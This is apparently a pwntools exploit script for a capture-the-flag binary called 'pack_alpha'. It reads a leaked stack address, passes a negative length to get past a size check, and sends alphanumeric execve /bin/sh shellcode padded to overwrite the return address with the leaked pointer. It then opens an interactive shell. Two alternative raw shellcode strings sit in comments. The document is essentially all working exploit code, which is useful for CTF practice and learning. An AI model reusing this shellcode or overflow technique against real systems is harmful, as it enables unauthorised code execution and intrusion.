from pwn import *

if __name__=="__main__":

	context(os='linux', arch='amd64')

	p = process('./pack_alpha')
	#p = remote('gc1.eng.run', 32385)
	gdb.attach(p)

	p.recv()
	p.sendline('b'*3)

	p.recv()
	p.sendline('12')

	p.recvuntil('Your room number is: ')
	leak = p.recvline()[:-1]
	leak = int(leak, 16)
	info("leak: %s"%hex(leak))

	p.recvuntil('Length of your name: ')
	p.sendline('-1')
	
	# alpha numeric shellcode:
	shell = 'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
	#shell = '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
	#shell = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
	pay = shell
	pay += 'a'*(0x80 - len(shell))
	pay += 'b'*8
	pay += p64(leak)
	p.send(pay)
	

	p.interactive()

